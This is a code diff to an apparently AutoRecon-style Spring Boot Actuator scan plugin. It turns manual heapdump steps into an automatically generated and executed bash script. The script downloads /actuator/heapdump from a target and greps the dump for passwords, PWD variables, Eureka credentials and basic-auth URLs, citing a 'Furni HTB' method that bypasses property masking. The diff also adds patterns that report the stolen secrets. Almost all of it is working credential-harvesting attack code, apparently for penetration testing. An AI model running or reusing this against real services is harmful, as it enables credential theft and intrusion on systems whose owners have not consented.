@@ -94,6 +94,13 @@ class SpringBootActuator(ServiceScan):
 		self.add_pattern(r'jdbc:[^:]+://([^:]+):([^@]+)@([^:/]+)', description='CRITICAL: JDBC credentials found: user={match1}, password={match2}, host={match3}')
 		self.add_pattern(r'://([^:]+):([^@]+)@([^:/]+):', description='CRITICAL: URL credentials found: user={match1}, password={match2}, host={match3}')
 		
+		# Automatic Heapdump Extraction Result Patterns (for main discoveries report)
+		self.add_pattern(r'CREDENTIAL_FOUND:PASSWORD:(.+)', description='🔥 EXTRACTED PASSWORD FROM HEAPDUMP: {match1}')
+		self.add_pattern(r'CREDENTIAL_FOUND:PWD:(.+)', description='🔥 EXTRACTED PWD VARIABLE FROM HEAPDUMP: {match1}')
+		self.add_pattern(r'CREDENTIAL_FOUND:EUREKA:(.+)', description='🔥 EXTRACTED EUREKA CREDENTIALS FROM HEAPDUMP: {match1}')
+		self.add_pattern(r'CREDENTIAL_FOUND:HTTP_AUTH:(.+)', description='🔥 EXTRACTED HTTP AUTH URL FROM HEAPDUMP: {match1}')
+		self.add_pattern(r'SUCCESS: Credentials extracted from heapdump', description='✅ HEAPDUMP CREDENTIAL EXTRACTION COMPLETED SUCCESSFULLY')
+		
 		# Cloud and Microservice Patterns
 		self.add_pattern(r'(?i)spring.cloud.config.server', description='Spring Cloud Config Server detected - centralized configuration management')
 		self.add_pattern(r'(?i)spring.cloud.gateway', description='Spring Cloud Gateway detected - API gateway service')
@@ -267,50 +274,65 @@ class SpringBootActuator(ServiceScan):
 						service.info(f"⚠️ Error checking heapdump: {e}")
 				
 				if heapdump_available:
-					# MANUAL HEAPDUMP EXTRACTION ONLY (avoids binary processing issues)
-					service.info(f"🚨 CRITICAL: Heapdump endpoint detected - manual extraction required!")
-					service.info(f"⚠️  Automatic heapdump processing disabled to prevent binary decode errors")
-					service.info(f"📋 Manual commands have been generated for credential extraction")
+					# AUTOMATIC HEAPDUMP CREDENTIAL EXTRACTION (safe external processing)
+					service.info(f"🚨 CRITICAL: Heapdump endpoint detected - extracting credentials automatically!")
+					service.info(f"🔍 Using external script processing to avoid binary decode errors")
 					
-					# Add heapdump extraction to manual commands instead of running automatically
-					heapdump_file = f'heapdump_{{port}}_{hostname_label}.hprof'
-					creds_file = f'RAW_CREDENTIALS_{{port}}_{hostname_label}.txt'
+					heapdump_file = f'{{scandir}}/heapdump_{{port}}_{hostname_label}.hprof'
+					creds_file = f'{{scandir}}/EXTRACTED_CREDENTIALS_{{port}}_{hostname_label}.txt'
+					temp_script = f'{{scandir}}/extract_creds_{{port}}_{hostname_label}.sh'
 					
-					# Create detailed manual commands for heapdump credential extraction
-					service.add_manual_command(f'🚨 CRITICAL: Extract credentials from heapdump (bypasses Spring Boot ******)', [
-						f'# FURNI HTB METHOD - Download and extract heapdump credentials',
-						f'# This bypasses Spring Boot property masking to get real passwords',
-						f'',
-						f'# Step 1: Download the heapdump file',
-						f'curl -s {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump -o {heapdump_file}',
-						f'',
-						f'# Step 2: Extract credentials using exact Furni HTB patterns',
-						f'echo "=== FURNI HTB - PASSWORD= PATTERNS ===" > {creds_file}',
-						f'strings {heapdump_file} | grep "password=" >> {creds_file}',
-						f'echo "" >> {creds_file}',
-						f'',
-						f'echo "=== FURNI HTB - PWD ENVIRONMENT VARIABLES ===" >> {creds_file}',
-						f'strings {heapdump_file} | grep "PWD" >> {creds_file}',
-						f'echo "" >> {creds_file}',
-						f'',
-						f'echo "=== EUREKA SERVER CREDENTIALS ===" >> {creds_file}',
-						f'strings {heapdump_file} | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" >> {creds_file}',
-						f'echo "" >> {creds_file}',
-						f'',
-						f'echo "=== ALL HTTP BASIC AUTH URLS ===" >> {creds_file}',
-						f'strings {heapdump_file} | grep -E "://.*:.*@" >> {creds_file}',
-						f'',
-						f'# Step 3: Quick preview of extracted credentials',
-						f'echo "🔍 EXTRACTED CREDENTIALS:"',
-						f'echo "=== Password patterns ==="',
-						f'strings {heapdump_file} | grep "password=" | head -5',
-						f'echo "=== PWD variables ==="',
-						f'strings {heapdump_file} | grep "PWD" | head -3',
-						f'echo "=== Eureka credentials ==="',
-						f'strings {heapdump_file} | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" | head -3',
-						f'',
-						f'echo "✅ Full results saved to: {creds_file}"'
-					])
+					# Create extraction script that outputs parseable results
+					extraction_script = f'''#!/bin/bash
+# Safe heapdump credential extraction script
+HEAPDUMP_URL="{{http_scheme}}://{hostname}:{{port}}/actuator/heapdump"
+HEAPDUMP_FILE="{heapdump_file}"
+CREDS_FILE="{creds_file}"
+
+# Download heapdump safely
+if curl -s -m {timeout*6} "$HEAPDUMP_URL" -o "$HEAPDUMP_FILE" >/dev/null 2>&1; then
+    if [ -f "$HEAPDUMP_FILE" ]; then
+        # Extract credentials and output in parseable format
+        echo "HEAPDUMP_EXTRACTION_START"
+        
+        # Extract password= patterns (Furni HTB style)
+        strings "$HEAPDUMP_FILE" | grep "password=" | while read line; do
+            echo "CREDENTIAL_FOUND:PASSWORD:$line"
+        done
+        
+        # Extract PWD environment variables  
+        strings "$HEAPDUMP_FILE" | grep "PWD" | while read line; do
+            echo "CREDENTIAL_FOUND:PWD:$line"
+        done
+        
+        # Extract Eureka server credentials
+        strings "$HEAPDUMP_FILE" | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" | while read line; do
+            echo "CREDENTIAL_FOUND:EUREKA:$line"
+        done
+        
+        # Extract HTTP Basic Auth URLs
+        strings "$HEAPDUMP_FILE" | grep -E "://[^:]+:[^@]+@" | while read line; do
+            echo "CREDENTIAL_FOUND:HTTP_AUTH:$line"
+        done
+        
+        echo "HEAPDUMP_EXTRACTION_END"
+        echo "SUCCESS: Credentials extracted from heapdump"
+    else
+        echo "ERROR: Heapdump file not created"
+    fi
+else
+    echo "ERROR: Failed to download heapdump"
+fi
+'''
+					
+					# Write and execute the extraction script
+					service.info(f"📥 Downloading and processing heapdump...")
+					await service.execute(
+						f'cat > {temp_script} << \'SCRIPT_EOF\'\n{extraction_script}\nSCRIPT_EOF\n'
+						f'chmod +x {temp_script}\n'
+						f'{temp_script}',
+						outfile=f'{{protocol}}_{{port}}_{{http_scheme}}_heapdump_extraction_{hostname_label}.txt'
+					)
 				else:
 					service.info("❌ Heapdump endpoint not accessible - trying alternative credential extraction...")
 					
